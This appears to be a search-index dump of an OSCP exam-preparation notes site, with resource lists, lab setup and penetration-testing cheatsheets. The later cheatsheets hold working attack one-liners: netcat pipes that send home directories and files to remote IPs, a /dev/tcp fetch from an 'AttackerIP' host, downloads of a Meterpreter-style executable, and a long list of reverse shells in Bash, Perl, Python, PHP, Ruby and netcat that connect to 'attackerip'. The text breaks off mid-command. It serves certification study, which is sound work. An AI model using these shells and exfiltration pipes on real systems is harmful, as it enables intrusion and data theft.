Attacks"},{"location":"certifications/oscp/_preparation/#practice","text":"Root-me.org https://www.rebootuser.com/ https://cmdchallenge.com/ https://vim-adventures.com/ https://lab.pentestit.ru/ https://ctf365.com/ https://pentesterlab.com/bootcamp https://exploit-exercises.com/mainsequence/ http://overthewire.org/wargames/natas/","title":"Practice"},{"location":"certifications/oscp/_preparation/#books","text":"Penetration Testing: A Hands-On Introduction to Hacking The Hacker Playbook 3: Practical Guide To Penetration Testing The Web Application Hacker\u2019s Handbook: Finding and Exploiting Security Flaws Black Hat Python: Python Programming for Hackers and Pentesters Hacking: The Art of Exploitation, 2 nd Edition","title":"Books"},{"location":"certifications/oscp/_preparation/#shell","text":"https://highon.coffee/blog/reverse-shell-cheat-sheet/ Spawning a TTY Shell: https://netsec.ws/?p=337 ICMP Reverse Shell: https://resources.infosecinstitute.com/icmp-reverse-shell/#gref","title":"Shell"},{"location":"certifications/oscp/_preparation/#payloads","text":"Creating Metasploit Payloads: https://netsec.ws/?p=331","title":"Payloads"},{"location":"certifications/oscp/_preparation/#sites","text":"OSCP Exam Guide , PentestMonkey , Hash Cracking Sites , Privilege Escalation , Practical OSCP Tips/Tricks , Exploit-DB , Low Priv Enum Linux (g0tmi1k) , Default Credentials (open-sez.me) , RTFM online , 0daysecurity master enumeration , how to use vi (for the brave) , GTFO bins (love these), LOL Bins Corelan Buffer Overflow Exploit Part 1 Buffer Overflow Guide by Stefan Molls File Transfer Guide , SQL Auth Bypass , SQL Injection Cheat Sheet , Metasploit Basics , LFI Cheat Sheet , Cold Fusion Cheat Sheet , All The Things Payloads , Ultimate Windows Priv Esc Methods , NFS Attacks , Michael LaSalvia: Path to the OSCP , Rumkin Cyphers , All the Exploit Papers , and OSCP Practical Tips . Movie : Zero Days Audio Books : Deep Work, The Art of Invisibility, Grit, Spam Nation, Red Team: How to think like the enemy, Ghost in the Wires, The Girl With the Dragon Tattoo, and Mastery.","title":"Sites"},{"location":"certifications/oscp/lab-setup/","text":"Lab Setup External Sources Terminator Configuration / Zsh: https://guide.offsecnewbie.com/kali-configuration/terminator-shortcuts CherryTree template: https://guide.offsecnewbie.com/cherrytree-oscp-template Aliases ## ALIASES alias vpn = openvpn /root/pwnshare/VPN/OS-XXXXX-PWK.ovpn alias rdp = rdesktop -g 85% -u offsec -p PASSWORD_HERE 10.11.14.134 alias mapshare = ln -s /mnt/hgfs/Pwn_Share/ /root/pwnshare alias l = ls -la alias webup = python -m SimpleHTTPServer 80 // run tcpdump \u2019 s from VPN interface and to only look at source IP \u2019 s from the other attackers range and with a destination of my assigned IP alias shieldsup = tcpdump -i tap0 -nnvv src net 10.11.0.0/24 and dst 10.11.0.54 -w - | tee capture.pcap | tcpdump -n -r - alias ss = searchsploit $1 alias ssx = searchsploit -x $1 Important Locations / etc / / etc / passwd / etc / fstab / etc / hosts / etc / init . d / usr / sbin Terminator Terminator Scrollback - Ctrl + Shift + O = Vertical split - Ctrl + Shift + E = Horizontal split - Ctrl + Shift + Z = Maximizes - Ctrl + Shift + T = New tab - Ctrl + Shift + C = Copy - Ctrl + Shift + V = Paste Proxychains /etc/proxychains.conf Comment : proxy_dns","title":"Lab Setup"},{"location":"certifications/oscp/lab-setup/#lab-setup","text":"","title":"Lab Setup"},{"location":"certifications/oscp/lab-setup/#external-sources","text":"Terminator Configuration / Zsh: https://guide.offsecnewbie.com/kali-configuration/terminator-shortcuts CherryTree template: https://guide.offsecnewbie.com/cherrytree-oscp-template","title":"External Sources"},{"location":"certifications/oscp/lab-setup/#aliases","text":"## ALIASES alias vpn = openvpn /root/pwnshare/VPN/OS-XXXXX-PWK.ovpn alias rdp = rdesktop -g 85% -u offsec -p PASSWORD_HERE 10.11.14.134 alias mapshare = ln -s /mnt/hgfs/Pwn_Share/ /root/pwnshare alias l = ls -la alias webup = python -m SimpleHTTPServer 80 // run tcpdump \u2019 s from VPN interface and to only look at source IP \u2019 s from the other attackers range and with a destination of my assigned IP alias shieldsup = tcpdump -i tap0 -nnvv src net 10.11.0.0/24 and dst 10.11.0.54 -w - | tee capture.pcap | tcpdump -n -r - alias ss = searchsploit $1 alias ssx = searchsploit -x $1","title":"Aliases"},{"location":"certifications/oscp/lab-setup/#important-locations","text":"/ etc / / etc / passwd / etc / fstab / etc / hosts / etc / init . d / usr / sbin","title":"Important Locations"},{"location":"certifications/oscp/lab-setup/#terminator","text":"Terminator Scrollback - Ctrl + Shift + O = Vertical split - Ctrl + Shift + E = Horizontal split - Ctrl + Shift + Z = Maximizes - Ctrl + Shift + T = New tab - Ctrl + Shift + C = Copy - Ctrl + Shift + V = Paste","title":"Terminator"},{"location":"certifications/oscp/lab-setup/#proxychains","text":"/etc/proxychains.conf Comment : proxy_dns","title":"Proxychains"},{"location":"certifications/oscp/notes/","text":"Notes Networking OSI / TCP / UDP https://www.pluralsight.com/blog/it-ops/networking-basics-tcp-udp-tcpip-osi-models","title":"Notes"},{"location":"certifications/oscp/notes/#notes","text":"","title":"Notes"},{"location":"certifications/oscp/notes/#networking","text":"","title":"Networking"},{"location":"certifications/oscp/notes/#osi-tcp-udp","text":"https://www.pluralsight.com/blog/it-ops/networking-basics-tcp-udp-tcpip-osi-models","title":"OSI / TCP / UDP"},{"location":"certifications/oscp/practice-vulnhub/","text":"Practice Beginner friendly Kioptrix 1 Kioptrix 2 Kioptrix 3 Kioptrix 4 Intermediate Kioptrix 5 Kioptrix 2014 Brainpan 1 MrRobot Vulnix Unknown Complexity FristiLeaks (1.3?) Stapler PwnLab VulnOS Wintermute SickOS1.2 SkyTower Pinky\u2019s Palace /dev/random: scream pWnOS (2.0) Metasploitable 1 Metasploitable 2 Lin.Security Temple of Doom Pinky\u2019s Palace v1 Pinky\u2019s Palace v2 Pinky\u2019s Palace v3 Pinky\u2019s Palace v4 zico2 Nebula Windows Hack The Box Metasploitable 3 - https://github.com/rapid7/metasploitable3/wiki https://github.com/magnetikonline/linuxmicrosoftievirtualmachines /dev/random: Sleepy - https://www.vulnhub.com/entry/devrandom-sleepy,123/ Bobby: 1 - https://www.vulnhub.com/entry/bobby-1,42/","title":"Practice"},{"location":"certifications/oscp/practice-vulnhub/#practice","text":"","title":"Practice"},{"location":"certifications/oscp/practice-vulnhub/#beginner-friendly","text":"","title":"Beginner friendly"},{"location":"certifications/oscp/practice-vulnhub/#kioptrix-1","text":"","title":"Kioptrix 1"},{"location":"certifications/oscp/practice-vulnhub/#kioptrix-2","text":"","title":"Kioptrix 2"},{"location":"certifications/oscp/practice-vulnhub/#kioptrix-3","text":"","title":"Kioptrix 3"},{"location":"certifications/oscp/practice-vulnhub/#kioptrix-4","text":"","title":"Kioptrix 4"},{"location":"certifications/oscp/practice-vulnhub/#intermediate","text":"","title":"Intermediate"},{"location":"certifications/oscp/practice-vulnhub/#kioptrix-5","text":"","title":"Kioptrix 5"},{"location":"certifications/oscp/practice-vulnhub/#kioptrix-2014","text":"","title":"Kioptrix 2014"},{"location":"certifications/oscp/practice-vulnhub/#brainpan-1","text":"","title":"Brainpan 1"},{"location":"certifications/oscp/practice-vulnhub/#mrrobot","text":"","title":"MrRobot"},{"location":"certifications/oscp/practice-vulnhub/#vulnix","text":"","title":"Vulnix"},{"location":"certifications/oscp/practice-vulnhub/#unknown-complexity","text":"","title":"Unknown Complexity"},{"location":"certifications/oscp/practice-vulnhub/#fristileaks-13","text":"","title":"FristiLeaks (1.3?)"},{"location":"certifications/oscp/practice-vulnhub/#stapler","text":"","title":"Stapler"},{"location":"certifications/oscp/practice-vulnhub/#pwnlab","text":"","title":"PwnLab"},{"location":"certifications/oscp/practice-vulnhub/#vulnos","text":"","title":"VulnOS"},{"location":"certifications/oscp/practice-vulnhub/#wintermute","text":"","title":"Wintermute"},{"location":"certifications/oscp/practice-vulnhub/#sickos12","text":"","title":"SickOS1.2"},{"location":"certifications/oscp/practice-vulnhub/#skytower","text":"","title":"SkyTower"},{"location":"certifications/oscp/practice-vulnhub/#pinkys-palace","text":"","title":"Pinky\u2019s Palace"},{"location":"certifications/oscp/practice-vulnhub/#devrandom-scream","text":"","title":"/dev/random: scream"},{"location":"certifications/oscp/practice-vulnhub/#pwnos-20","text":"","title":"pWnOS (2.0)"},{"location":"certifications/oscp/practice-vulnhub/#metasploitable-1","text":"","title":"Metasploitable 1"},{"location":"certifications/oscp/practice-vulnhub/#metasploitable-2","text":"","title":"Metasploitable 2"},{"location":"certifications/oscp/practice-vulnhub/#linsecurity","text":"","title":"Lin.Security"},{"location":"certifications/oscp/practice-vulnhub/#temple-of-doom","text":"","title":"Temple of Doom"},{"location":"certifications/oscp/practice-vulnhub/#pinkys-palace-v1","text":"","title":"Pinky\u2019s Palace v1"},{"location":"certifications/oscp/practice-vulnhub/#pinkys-palace-v2","text":"","title":"Pinky\u2019s Palace v2"},{"location":"certifications/oscp/practice-vulnhub/#pinkys-palace-v3","text":"","title":"Pinky\u2019s Palace v3"},{"location":"certifications/oscp/practice-vulnhub/#pinkys-palace-v4","text":"","title":"Pinky\u2019s Palace v4"},{"location":"certifications/oscp/practice-vulnhub/#zico2","text":"","title":"zico2"},{"location":"certifications/oscp/practice-vulnhub/#nebula","text":"","title":"Nebula"},{"location":"certifications/oscp/practice-vulnhub/#windows","text":"Hack The Box Metasploitable 3 - https://github.com/rapid7/metasploitable3/wiki https://github.com/magnetikonline/linuxmicrosoftievirtualmachines /dev/random: Sleepy - https://www.vulnhub.com/entry/devrandom-sleepy,123/ Bobby: 1 - https://www.vulnhub.com/entry/bobby-1,42/","title":"Windows"},{"location":"certifications/oscp/setup/","text":"","title":"Setup"},{"location":"certifications/oscp/y-Tools/","text":"Tools Targeted Tools https://github.com/rejoinder/oscp-enumeration-script/blob/master/scan.sh https://github.com/Tib3rius/AutoRecon https://github.com/codingo/Reconnoitre https://github.com/RoliSoft/ReconScan https://github.com/jbarcia/TrustedSec/tree/master/recon_scan https://github.com/sleventyeleven/linuxprivchecker/blob/master/linuxprivchecker.py https://github.com/codingo/OSCP-2/blob/master/BASH/LinuxPrivCheck.sh https://github.com/welchbj/bscan https://github.com/xapax/oscp https://github.com/gajos112/OSCP-2 https://github.com/noraj/OSCP-Exam-Report-Template-Markdown https://github.com/OlivierLaflamme/Cheatsheet-God https://github.com/rewardone/OSCPRepo https://github.com/0x4D31/awesome-oscp https://github.com/rebootuser/LinEnum https://github.com/M4ximuss/Powerless https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1 nmap, ncat, tmux, SSH, sparta, gobuster, burp suite, nikto, hydra, enum4linux, rpcclient, snmpwalk, icacls, dotdotpwn, searchsploit, ftp (in general, smtp (in general), linenum.sh , linux exploit suggester , msfvenom, wireshark, and sherlock.ps1 . OSCP Collections http://downloads.kali.org/pwk-kali-vm.7z https://github.com/xapax/oscp Linux Explainshell - http://www.explainshell.com/ Script - Store shell history as a script - https://manpages.debian.org/testing/bsdutils/script.1.en.html Immunity Debugger and Mona. Mona part found at https://github.com/corelan/mona Networking Netcat - Ncat - Wireshark - TCPdump - Enumeration http://0daysecurity.com/penetration-testing/enumeration.html Google dorks Whois Netcraft Recon-ng Password Attacks Hydra - http://sectools.org/tool/hydra/ JTR - https://github.com/magnumripper/JohnTheRipper Medusa - https://en.kali.tools/?p=200 https://crackstation.net/ https://hashkiller.co.uk/ http://md5decrypt.net/en/Ntlm/","title":"Tools"},{"location":"certifications/oscp/y-Tools/#tools","text":"","title":"Tools"},{"location":"certifications/oscp/y-Tools/#targeted-tools","text":"https://github.com/rejoinder/oscp-enumeration-script/blob/master/scan.sh https://github.com/Tib3rius/AutoRecon https://github.com/codingo/Reconnoitre https://github.com/RoliSoft/ReconScan https://github.com/jbarcia/TrustedSec/tree/master/recon_scan https://github.com/sleventyeleven/linuxprivchecker/blob/master/linuxprivchecker.py https://github.com/codingo/OSCP-2/blob/master/BASH/LinuxPrivCheck.sh https://github.com/welchbj/bscan https://github.com/xapax/oscp https://github.com/gajos112/OSCP-2 https://github.com/noraj/OSCP-Exam-Report-Template-Markdown https://github.com/OlivierLaflamme/Cheatsheet-God https://github.com/rewardone/OSCPRepo https://github.com/0x4D31/awesome-oscp https://github.com/rebootuser/LinEnum https://github.com/M4ximuss/Powerless https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1 nmap, ncat, tmux, SSH, sparta, gobuster, burp suite, nikto, hydra, enum4linux, rpcclient, snmpwalk, icacls, dotdotpwn, searchsploit, ftp (in general, smtp (in general), linenum.sh , linux exploit suggester , msfvenom, wireshark, and sherlock.ps1 .","title":"Targeted Tools"},{"location":"certifications/oscp/y-Tools/#oscp-collections","text":"http://downloads.kali.org/pwk-kali-vm.7z https://github.com/xapax/oscp","title":"OSCP Collections"},{"location":"certifications/oscp/y-Tools/#linux","text":"Explainshell - http://www.explainshell.com/ Script - Store shell history as a script - https://manpages.debian.org/testing/bsdutils/script.1.en.html Immunity Debugger and Mona. Mona part found at https://github.com/corelan/mona","title":"Linux"},{"location":"certifications/oscp/y-Tools/#networking","text":"Netcat - Ncat - Wireshark - TCPdump -","title":"Networking"},{"location":"certifications/oscp/y-Tools/#enumeration","text":"http://0daysecurity.com/penetration-testing/enumeration.html Google dorks Whois Netcraft Recon-ng","title":"Enumeration"},{"location":"certifications/oscp/y-Tools/#password-attacks","text":"Hydra - http://sectools.org/tool/hydra/ JTR - https://github.com/magnumripper/JohnTheRipper Medusa - https://en.kali.tools/?p=200 https://crackstation.net/ https://hashkiller.co.uk/ http://md5decrypt.net/en/Ntlm/","title":"Password Attacks"},{"location":"certifications/oscp/cheatsheet/0-cheatsheet/","text":"Cheatsheets Common Ports: http://packetlife.net/media/library/23/common_ports.pdf","title":"Cheatsheets"},{"location":"certifications/oscp/cheatsheet/0-cheatsheet/#cheatsheets","text":"Common Ports: http://packetlife.net/media/library/23/common_ports.pdf","title":"Cheatsheets"},{"location":"certifications/oscp/cheatsheet/download/","text":"Powershell $ p = New - Object System . Net . WebClient $ p . DownloadFile ( http://domain/file C:%homepath%file ) powershell set - executionpolicy unrestricted PS C : . test . ps1 Visual Basic Set args = Wscript . Arguments Url = http://domain/file dim xHttp : Set xHttp = createobject ( Microsoft.XMLHTTP ) dim bStrm : Set bStrm = createobject ( Adodb.Stream ) xHttp . Open GET , Url , False xHttp . Send with bStrm . type = 1 .open .write xHttp.responseBody .savetofile C:%homepath%file , 2 end with cscript test . vbs Perl # !/ usr / bin / perl use LWP :: Simple ; getstore ( http://domain/file , file ); Python #!/usr/bin/python import urllib2 u = urllib2.urlopen( http://domain/file ) localFile = open( local_file , w ) localFile.write(u.read()) localFile.close() Ruby #!/ usr / bin / ruby require net/http Net :: HTTP . start ( www.domain.com ) { | http | r = http . get ( /file ) open ( save_location , wb ) { | file | file . write ( r . body ) } } PHP #!/usr/bin/php ?php $data = @ file ( http://example.com/file ); $lf = local_file ; $fh = fopen ( $lf , w ); fwrite ( $fh , $data [ 0 ]); fclose ( $fh ); ? FTP ftp 127 . 0 . 0 . 1 username password get file exit TFTP tftp - i host GET C : % homepath % file location_of_file_on_tftp_server Bitsadmin bitsadmin / transfer n http : // domain / file c : % homepath % file Wget wget http : // example . com / file SMB net use x : \\ 127 . 0 . 0 . 1 share / user : example . comuserID myPassword Notepad Open notepad Go to file \u2013 open In the File Name box near the bottom, type in the full URL path to your file","title":"Download"},{"location":"certifications/oscp/cheatsheet/download/#powershell","text":"$ p = New - Object System . Net . WebClient $ p . DownloadFile ( http://domain/file C:%homepath%file ) powershell set - executionpolicy unrestricted PS C : . test . ps1","title":"Powershell"},{"location":"certifications/oscp/cheatsheet/download/#visual-basic","text":"Set args = Wscript . Arguments Url = http://domain/file dim xHttp : Set xHttp = createobject ( Microsoft.XMLHTTP ) dim bStrm : Set bStrm = createobject ( Adodb.Stream ) xHttp . Open GET , Url , False xHttp . Send with bStrm . type = 1 .open .write xHttp.responseBody .savetofile C:%homepath%file , 2 end with cscript test . vbs","title":"Visual Basic"},{"location":"certifications/oscp/cheatsheet/download/#perl","text":"# !/ usr / bin / perl use LWP :: Simple ; getstore ( http://domain/file , file );","title":"Perl"},{"location":"certifications/oscp/cheatsheet/download/#python","text":"#!/usr/bin/python import urllib2 u = urllib2.urlopen( http://domain/file ) localFile = open( local_file , w ) localFile.write(u.read()) localFile.close()","title":"Python"},{"location":"certifications/oscp/cheatsheet/download/#ruby","text":"#!/ usr / bin / ruby require net/http Net :: HTTP . start ( www.domain.com ) { | http | r = http . get ( /file ) open ( save_location , wb ) { | file | file . write ( r . body ) } }","title":"Ruby"},{"location":"certifications/oscp/cheatsheet/download/#php","text":"#!/usr/bin/php ?php $data = @ file ( http://example.com/file ); $lf = local_file ; $fh = fopen ( $lf , w ); fwrite ( $fh , $data [ 0 ]); fclose ( $fh ); ?","title":"PHP"},{"location":"certifications/oscp/cheatsheet/download/#ftp","text":"ftp 127 . 0 . 0 . 1 username password get file exit","title":"FTP"},{"location":"certifications/oscp/cheatsheet/download/#tftp","text":"tftp - i host GET C : % homepath % file location_of_file_on_tftp_server","title":"TFTP"},{"location":"certifications/oscp/cheatsheet/download/#bitsadmin","text":"bitsadmin / transfer n http : // domain / file c : % homepath % file","title":"Bitsadmin"},{"location":"certifications/oscp/cheatsheet/download/#wget","text":"wget http : // example . com / file","title":"Wget"},{"location":"certifications/oscp/cheatsheet/download/#smb","text":"net use x : \\ 127 . 0 . 0 . 1 share / user : example . comuserID myPassword","title":"SMB"},{"location":"certifications/oscp/cheatsheet/download/#notepad","text":"Open notepad Go to file \u2013 open In the File Name box near the bottom, type in the full URL path to your file","title":"Notepad"},{"location":"certifications/oscp/cheatsheet/exploits/","text":"MS17-010 (EternalBlue) https://github.com/3ndG4me/AutoBlue-MS17-010","title":"Exploits"},{"location":"certifications/oscp/cheatsheet/exploits/#ms17-010-eternalblue","text":"https://github.com/3ndG4me/AutoBlue-MS17-010","title":"MS17-010 (EternalBlue)"},{"location":"certifications/oscp/cheatsheet/post-exploitation/","text":"uname - a hostname whoami id ifconfig Network Scanning nmap - sn 10 . 0 . 0 . 0 / 24 nmap - A - oA nmap $ targetip nmap - v - p - - sT $ targetip Web Scanning nikto - host $ targetip - port $ targetport . / dirsearch . py - w / usr / share / wordlists / dirbuster / directory - list - 2 . 3 - medium . txt - u $ targetip - e php SMB locate * . nse | grep smb nmap - p 139 , 445 --script=$scriptname $targetip nmap - p 139 , 445 --script=smb-vuln* $targetip enum4linux - a $ targetip smbclient \\\\\\\\$ ip \\\\$ share FTP ftp $ targetip Username : anonymous Password : anything Banner Grabbing nc $ targetip $ port Find Exploit searchsploit - u searchsploit $ multiple $ search $ terms msfconsole search $ searchterm","title":"Post exploitation"},{"location":"certifications/oscp/cheatsheet/post-exploitation/#network-scanning","text":"nmap - sn 10 . 0 . 0 . 0 / 24 nmap - A - oA nmap $ targetip nmap - v - p - - sT $ targetip","title":"Network Scanning"},{"location":"certifications/oscp/cheatsheet/post-exploitation/#web-scanning","text":"nikto - host $ targetip - port $ targetport . / dirsearch . py - w / usr / share / wordlists / dirbuster / directory - list - 2 . 3 - medium . txt - u $ targetip - e php","title":"Web Scanning"},{"location":"certifications/oscp/cheatsheet/post-exploitation/#smb","text":"locate * . nse | grep smb nmap - p 139 , 445 --script=$scriptname $targetip nmap - p 139 , 445 --script=smb-vuln* $targetip enum4linux - a $ targetip smbclient \\\\\\\\$ ip \\\\$ share","title":"SMB"},{"location":"certifications/oscp/cheatsheet/post-exploitation/#ftp","text":"ftp $ targetip Username : anonymous Password : anything","title":"FTP"},{"location":"certifications/oscp/cheatsheet/post-exploitation/#banner-grabbing","text":"nc $ targetip $ port","title":"Banner Grabbing"},{"location":"certifications/oscp/cheatsheet/post-exploitation/#find-exploit","text":"searchsploit - u searchsploit $ multiple $ search $ terms msfconsole search $ searchterm","title":"Find Exploit"},{"location":"certifications/oscp/cheatsheet/share-files/","text":"Over SMB https://github.com/SecureAuthCorp/impacket/blob/master/impacket/smbserver.py- python impacket - smbserver . py test1 `pwd` smbclient - L local - ip -- no - pass net view \\\\ 10 . 10 . 14 . 9 \\\\ 10 . 10 . 14 . 9 \\ test1 \\ test . exe Over NetCat cat file . txt | nc 192 . 168 . 1 . 123 34567 nc - l - p 34567 file . txt Tar over NetCat # Send one file tar cfv - file | nc 192 . 168 . 1 . 123 34567 # Send multiple files tar cfv - file1 file2 file3 | nc 192 . 168 . 1 . 123 34567 # Send multiple files tar cfv - * . doc | nc 192 . 168 . 1 . 123 34567 # Send this dir and subdirectories tar cfv - * | nc 192 . 168 . 1 . 123 34567 # Send a specified directory tar cfv - important_stuff / | nc 192 . 168 . 1 . 123 34567 # Send a specified directory and maintain absolute dir structure tar cfv - / home / joe | nc 192 . 168 . 1 . 123 34567 nc - l - p 34567 | tar xfv - GZIP over NetCat tar cfv - file1 file2 file3 | gzip - c | nc 192 . 168 . 1 . 123 34567 nc - l - p 34567 | gunzip - c | tar xfv - Encrypted Tar over NetCat openssl rand 9999 | shasum tar cfv - secret_file . * . txt | gzip - c | openssl enc - aes - 256 - cbc - salt - k a8280ba2ebc37d03bb0ffdb097ccdf7d5f56a8cd - md md5 | nc 10 . 100 . 1 . 27 45678 nc - l - p 45678 | openssl enc - aes - 256 - cbc - d - k a8280ba2ebc37d03bb0ffdb097ccdf7d5f56a8cd - md md5 | gunzip - c | tar xfv - Encrypted Tar over NetCat as Base64 tar cfv - secret_file . * . txt | gzip - c | openssl enc - aes - 256 - cbc - salt - a - k a8280ba2ebc37d03bb0ffdb097ccdf7d5f56a8cd - md md5 | nc 10 . 100 . 1 . 27 45678 nc - l - p 45678 | openssl enc - aes - 256 - cbc - d - a - k a8280ba2ebc37d03bb0ffdb097ccdf7d5f56a8cd - md md5 | gunzip - c | tar xfv - Pull file using NetCat nc - q0 - l - p 5454 potential_attack_vectors . txt nc 192 . 168 . 100 . 185 5454 potential_attack_vectors . txt Over HTTP python - m SimpleHTTPServer ( new - object System . Net . WebClient ). DownloadFile ( http://10.9.122.8/met8888.exe , C:\\Users\\jarrieta\\Desktop\\met8888.exe ) ( echo - e GET /filename_you_are_moving HTTP/0.9\\r \\n \\r \\n \\ 1 3 cat 0 3 ) 3 / dev / tcp / AttackerIP / 80 \\ | ( read i ; while [ $(echo $i | tr -d \\r ) != ]; \\ do read i ; done; cat) local_filename Over FTP apt - get install python - pyftpdlib python - m pyftpdlib - p 21 OR auxiliary / server / ftp ftp_commands.txt: open 10 . 9 . 122 . 8 anonymous whatever binary get met8888 . exe bye ftp - s : ftp_commands . txt echo open 10 . 9 . 122 . 8 ftp_commands . txt echo anonymous ftp_commands . txt echo password ftp_commands . txt echo binary ftp_commands . txt echo get met8888 . exe ftp_commands . txt echo bye ftp_commands . txt ftp - s : ftp_commands . txt Over TFTP apt - get install atftpd service atftpd start auxiliary / server / tftp pkgmgr / iu : TFTP tftp - i 10 . 9 . 122 . 8 GET met8888 . exe tftp - i 10 . 9 . 122 . 8 PUT met8888 . exe References https://h4ck.co/oscp-journey-exam-lab-prep-tips/","title":"Share files"},{"location":"certifications/oscp/cheatsheet/share-files/#over-smb","text":"https://github.com/SecureAuthCorp/impacket/blob/master/impacket/smbserver.py- python impacket - smbserver . py test1 `pwd` smbclient - L local - ip -- no - pass net view \\\\ 10 . 10 . 14 . 9 \\\\ 10 . 10 . 14 . 9 \\ test1 \\ test . exe","title":"Over SMB"},{"location":"certifications/oscp/cheatsheet/share-files/#over-netcat","text":"cat file . txt | nc 192 . 168 . 1 . 123 34567 nc - l - p 34567 file . txt","title":"Over NetCat"},{"location":"certifications/oscp/cheatsheet/share-files/#tar-over-netcat","text":"# Send one file tar cfv - file | nc 192 . 168 . 1 . 123 34567 # Send multiple files tar cfv - file1 file2 file3 | nc 192 . 168 . 1 . 123 34567 # Send multiple files tar cfv - * . doc | nc 192 . 168 . 1 . 123 34567 # Send this dir and subdirectories tar cfv - * | nc 192 . 168 . 1 . 123 34567 # Send a specified directory tar cfv - important_stuff / | nc 192 . 168 . 1 . 123 34567 # Send a specified directory and maintain absolute dir structure tar cfv - / home / joe | nc 192 . 168 . 1 . 123 34567 nc - l - p 34567 | tar xfv -","title":"Tar over NetCat"},{"location":"certifications/oscp/cheatsheet/share-files/#gzip-over-netcat","text":"tar cfv - file1 file2 file3 | gzip - c | nc 192 . 168 . 1 . 123 34567 nc - l - p 34567 | gunzip - c | tar xfv -","title":"GZIP over NetCat"},{"location":"certifications/oscp/cheatsheet/share-files/#encrypted-tar-over-netcat","text":"openssl rand 9999 | shasum tar cfv - secret_file . * . txt | gzip - c | openssl enc - aes - 256 - cbc - salt - k a8280ba2ebc37d03bb0ffdb097ccdf7d5f56a8cd - md md5 | nc 10 . 100 . 1 . 27 45678 nc - l - p 45678 | openssl enc - aes - 256 - cbc - d - k a8280ba2ebc37d03bb0ffdb097ccdf7d5f56a8cd - md md5 | gunzip - c | tar xfv -","title":"Encrypted Tar over NetCat"},{"location":"certifications/oscp/cheatsheet/share-files/#encrypted-tar-over-netcat-as-base64","text":"tar cfv - secret_file . * . txt | gzip - c | openssl enc - aes - 256 - cbc - salt - a - k a8280ba2ebc37d03bb0ffdb097ccdf7d5f56a8cd - md md5 | nc 10 . 100 . 1 . 27 45678 nc - l - p 45678 | openssl enc - aes - 256 - cbc - d - a - k a8280ba2ebc37d03bb0ffdb097ccdf7d5f56a8cd - md md5 | gunzip - c | tar xfv -","title":"Encrypted Tar over NetCat as Base64"},{"location":"certifications/oscp/cheatsheet/share-files/#pull-file-using-netcat","text":"nc - q0 - l - p 5454 potential_attack_vectors . txt nc 192 . 168 . 100 . 185 5454 potential_attack_vectors . txt","title":"Pull file using NetCat"},{"location":"certifications/oscp/cheatsheet/share-files/#over-http","text":"python - m SimpleHTTPServer ( new - object System . Net . WebClient ). DownloadFile ( http://10.9.122.8/met8888.exe , C:\\Users\\jarrieta\\Desktop\\met8888.exe ) ( echo - e GET /filename_you_are_moving HTTP/0.9\\r \\n \\r \\n \\ 1 3 cat 0 3 ) 3 / dev / tcp / AttackerIP / 80 \\ | ( read i ; while [ $(echo $i | tr -d \\r ) != ]; \\ do read i ; done; cat) local_filename","title":"Over HTTP"},{"location":"certifications/oscp/cheatsheet/share-files/#over-ftp","text":"apt - get install python - pyftpdlib python - m pyftpdlib - p 21 OR auxiliary / server / ftp ftp_commands.txt: open 10 . 9 . 122 . 8 anonymous whatever binary get met8888 . exe bye ftp - s : ftp_commands . txt echo open 10 . 9 . 122 . 8 ftp_commands . txt echo anonymous ftp_commands . txt echo password ftp_commands . txt echo binary ftp_commands . txt echo get met8888 . exe ftp_commands . txt echo bye ftp_commands . txt ftp - s : ftp_commands . txt","title":"Over FTP"},{"location":"certifications/oscp/cheatsheet/share-files/#over-tftp","text":"apt - get install atftpd service atftpd start auxiliary / server / tftp pkgmgr / iu : TFTP tftp - i 10 . 9 . 122 . 8 GET met8888 . exe tftp - i 10 . 9 . 122 . 8 PUT met8888 . exe","title":"Over TFTP"},{"location":"certifications/oscp/cheatsheet/share-files/#references","text":"https://h4ck.co/oscp-journey-exam-lab-prep-tips/","title":"References"},{"location":"certifications/oscp/cheatsheet/shell/","text":"Bash bash - i / dev / tcp / 10 . 0 . 0 . 1 / 8080 0 1 exec / bin / bash 0 0 2 0 0 196 ;exec 196 /dev/tcp/attackerip/4444; sh 196 196 2 196 Create a new descriptor which is assigned to a network node. Then we will read and write to that descriptor (does not work in Debian): exec 5 / dev / tcp / attackerip / 4444 cat 5 | while read line ; do $line 2 5 5; done # or : while read line 0 5 ; do $line 2 5 5; done Banner a HTTP server using Bash: #!/bin/bash exec 3 /dev/tcp/ $1 /80 echo -e Get /simple?se=1 HTTP/1.0\\n 3 cat 3 Perl Unix: perl - e use Socket;$i= 10.0.0.1 ;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname( tcp ));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN, S );open(STDOUT, S );open(STDERR, S );exec( /bin/sh -i );}; perl - MIO - e $p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr, attackerip:4444 );STDIN- fdopen($c,r);$~- fdopen($c,w);system$_ while ; # Without IO perl - MIO :: Socket - e $p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr = 127.0.0.1:1234 );STDIN- fdopen($c,r);$~- fdopen($c,w);system$_ while ; Windows perl - MIO - e $c=new IO::Socket::INET(PeerAddr, attackerip:4444 );STDIN- fdopen($c,r);$~- fdopen($c,w);system$_ while ; # Without IO perl - MIO :: Socket - e $c=new IO::Socket::INET(PeerAddr = 127.0.0.1:1234 );STDIN- fdopen($c,r);$~- fdopen($c,w);system$_ while ; print $ sock eval ( $ sock ) while ( $ sock ||= IO :: Socket :: INET - new ( PeerAddr = 127.0.0.1 , PeerPort = 23666 )) Python python - c import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(( 10.0.0.1 ,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([ /bin/sh , -i ]); PHP php - r $sock=fsockopen( 10.0.0.1 ,1234);exec( /bin/sh -i 3 3 2 3 ); ? php $ sock = fsockopen ( 10.0.0.1 , 1234 ) ;exec( /bin/sh -i 3 3 2 3 ); ? Ruby Unix ruby - rsocket - e f=TCPSocket.open( 10.0.0.1 ,1234).to_i;exec sprintf( /bin/sh -i %d %d 2 %d ,f,f,f) ruby - rsocket - e exit if fork;c=TCPSocket.new( attackerip , 4444 );while(cmd=c.gets);IO.popen(cmd, r ){|io|c.print io.read}end Windows ruby - rsocket - e c=TCPSocket.new( attackerip , 4444 );while(cmd=c.gets);IO.popen(cmd, r ){|io|c.print io.read}end NetCat nc - e / bin / sh 10 . 0 . 0 . 1 1234 nc - c / bin 